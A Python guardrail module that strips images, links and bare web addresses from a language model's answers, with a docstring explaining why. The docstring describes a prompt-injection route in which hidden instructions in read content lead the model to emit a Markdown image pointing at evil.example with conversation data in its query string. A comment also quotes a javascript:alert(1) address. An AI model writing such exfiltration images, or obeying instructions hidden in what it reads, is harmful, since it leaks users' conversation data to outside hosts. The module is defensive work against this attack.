"""Output handling: no external link and no image in an answer.

The answer is text the model wrote, and what the model wrote can come from an instruction hidden in
what it read (a pasted page, a card). A Markdown image `![](https://evil.example/p.png?d=...)` is
fetched by the browser as soon as the answer is shown, with whatever the model put in the address:
a channel out of the conversation that needs no tool and no click. A link is the same one click away.
The cards cite their sources by id (`[coach_pioli]`), never by address, so an answer has no use for
either: images are removed, a link keeps its text, a bare address is removed. Deterministic, with no
model: it holds whatever the model or the prompt is.

The citations (`[case_2022_wc_final_argentina_france, p. 4]`) and the references in brackets of the
cards (`(Spalla, pp. 45-46)`) have no address and stay as they are.
"""

from __future__ import annotations

import re

_SCHEME = r"(?:[a-z][a-z0-9+.\-]*:|//|www\.)"   # http:, https:, javascript:, data:, mailto:, //host, www.host
_TARGET = r"(?:[^()]|\([^()]*\))*"   # an address, with one level of parentheses: javascript:alert(1)
_IMAGE_RE = re.compile(rf"!\[[^\]]*\]\({_TARGET}\)|!\[[^\]]*\]\[[^\]]*\]")
_LINK_RE = re.compile(rf"\[(?P<text>[^\]]*)\]\(\s*<?{_SCHEME}(?:[^()]|\([^()]*\))*\)", re.IGNORECASE)
_DEFINITION_RE = re.compile(rf"^[ \t]*\[(?P<label>[^\]]+)\]:[ \t]*<?(?P<target>{_SCHEME}\S*)>?.*$", re.IGNORECASE | re.MULTILINE)
_AUTOLINK_RE = re.compile(rf"<{_SCHEME}[^>\s]*>", re.IGNORECASE)
_BARE_RE = re.compile(r"(?:\b[a-z][a-z0-9+.\-]*://|\bwww\.)[^\s<>)\]\"']+", re.IGNORECASE)
_EMPTY_BRACKETS_RE = re.compile(r"\(\s*\)")


def strip_external_links(answer: str) -> tuple[str, list[str]]:
    """The answer with no image and no address, and what was removed (addresses and image
    markers, in order and once each), for the guardrails' report.

    In this order: images (any target), links with an address (their text stays), reference
    definitions (`[1]: https://...`) and the references to them, autolinks (`<https://...>`), bare
    addresses; then the empty parentheses and the spaces they leave."""
    removed: list[str] = []

    def drop(match: re.Match, replacement: str = "") -> str:
        removed.append(match.group(0).strip())
        return replacement

    text = _IMAGE_RE.sub(drop, answer)
    text = _LINK_RE.sub(lambda m: drop(m, m.group("text")), text)
    labels = {m.group("label").lower() for m in _DEFINITION_RE.finditer(text)}
    text = _DEFINITION_RE.sub(drop, text)
    for label in labels:   # "[text][1]" whose definition went: only the text
        text = re.sub(rf"\[([^\]]+)\]\[{re.escape(label)}\]", r"\1", text, flags=re.IGNORECASE)
    text = _AUTOLINK_RE.sub(drop, text)
    text = _BARE_RE.sub(drop, text)
    if not removed:
        return answer, []
    text = _EMPTY_BRACKETS_RE.sub("", text)
    text = re.sub(r"[ \t]+(?=[.,;:!?)])", "", text)    # "see ." left by a removed address
    text = re.sub(r"[ \t]+\n", "\n", text)
    text = re.sub(r"\n{3,}", "\n\n", text)
    text = re.sub(r"(?<=\S)[ \t]{2,}", " ", text)
    return text.strip(), list(dict.fromkeys(removed))
